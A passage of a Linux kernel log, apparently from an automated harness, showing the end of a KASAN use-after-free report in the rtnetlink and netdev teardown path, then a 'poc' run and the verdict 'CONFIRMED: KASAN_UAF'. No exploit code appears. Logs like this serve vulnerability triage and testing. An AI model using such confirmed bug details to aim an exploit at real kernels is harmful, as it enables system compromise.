[    1.548882]  netdev_run_todo+0x6fe/0x9f0
[    1.549110]  rtnetlink_rcv_msg+0x531/0x9a0
[    1.549349]  netlink_rcv_skb+0x11d/0x350
[    1.549581]  netlink_unicast+0x574/0x7e0
[    1.549816]  netlink_sendmsg+0x79f/0xc50
[    1.550052]  __sock_sendmsg+0xdf/0x110
[    1.550279]  ____sys_sendmsg+0x5bd/0x7c0
[    1.550511]  ___sys_sendmsg+0xfb/0x170
[    1.550730]  __sys_sendmsg+0xd0/0x170
[    1.550943]  do_syscall_64+0x37/0x90
[    1.551151]  entry_SYSCALL_64_after_hwframe+0x62/0xcc
[    1.551445] 
[    1.551536] The buggy address belongs to the object at ffff88800969a000
[    1.551536]  which belongs to the cache kmalloc-4k of size 4096
[    1.552245] The buggy address is located 0 bytes inside of
[    1.552245]  4096-byte region [ffff88800969a000, ffff88800969b000)
[    1.552904] The buggy address belongs to the page:
[    1.553180] page:00000000ecc7bfc4 refcount:1 mapcount:0 mapping:0000000000000000 index:0x0 pfn:0x9698
[    1.553706] head:00000000ecc7bfc4 order:3 compound_mapcount:0 compound_pincount:0
[    1.554131] flags: 0x100000000010200(slab|head|node=0|zone=1)
[    1.554466] raw: 0100000000010200 0000000000000000 dead000000000122 ffff888005c42140
[    1.554914] raw: 0000000000000000 0000000000040004 00000001ffffffff 0000000000000000
[    1.555367] page dumped because: kasan: bad access detected
[    1.555686] 
[    1.555776] Memory state around the buggy address:
[    1.556052]  ffff888009699f00: fc fc fc fc fc fc fc fc fc fc fc fc fc fc fc fc
[    1.556464]  ffff888009699f80: fc fc fc fc fc fc fc fc fc fc fc fc fc fc fc fc
[    1.556874] >ffff88800969a000: fa fb fb fb fb fb fb fb fb fb fb fb fb fb fb fb
[    1.557287]                    ^
[    1.557475]  ffff88800969a080: fb fb fb fb fb fb fb fb fb fb fb fb fb fb fb fb
[    1.557891]  ffff88800969a100: fb fb fb fb fb fb fb fb fb fb fb fb fb fb fb fb
[    1.558318] ==================================================================
[    1.558745] Disabling lock debugging due to kernel taint
[    1.643402] tsc: Refined TSC clocksource calibration: 3187.030 MHz
[    1.644154] clocksource: tsc: mask: 0xffffffffffffffff max_cycles: 0x2df06db330f, max_idle_ns: 440795349608 ns
[    1.645415] clocksource: Switched to clocksource tsc
[    1.882585] input: ImExPS/2 Generic Explorer Mouse as /devices/platform/i8042/serio1/input/input3
poc: done (no cr[    3.162026] poc (82) used greatest stack depth: 25640 bytes left
ash observed)
---- poc end rc=0 ----
secb: poc exited without crashing the kernel
[    4.401553] ACPI: PM: Preparing to enter system sleep state S5
[    4.402130] reboot: Power down
CONFIRMED: KASAN_UAF
